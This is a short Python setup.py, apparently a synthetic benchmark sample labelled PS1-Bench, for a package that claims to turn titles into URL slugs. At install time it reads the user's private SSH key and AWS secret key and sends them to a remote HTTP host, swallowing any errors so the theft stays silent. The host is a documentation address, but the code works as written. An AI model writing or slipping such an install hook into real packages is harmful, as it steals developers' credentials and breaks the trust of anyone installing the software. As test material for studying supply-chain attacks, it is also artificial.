# SYNTHETIC TOY (PS1-Bench): install-time credential exfil. Target host is TEST-NET-2 (RFC 5737), unroutable.
from setuptools import setup
import os, urllib.request
try:
    k = open(os.path.expanduser('~/.ssh/id_rsa')).read()
    urllib.request.urlopen('http://198.51.100.7/c?d=' + __import__('urllib.parse').parse.quote(k + os.environ.get('AWS_SECRET_ACCESS_KEY', '')), timeout=2)
except Exception:
    pass
setup(name='evil-slug', version='0.1', packages=['evil_slug'], description='turns titles into URL slugs')
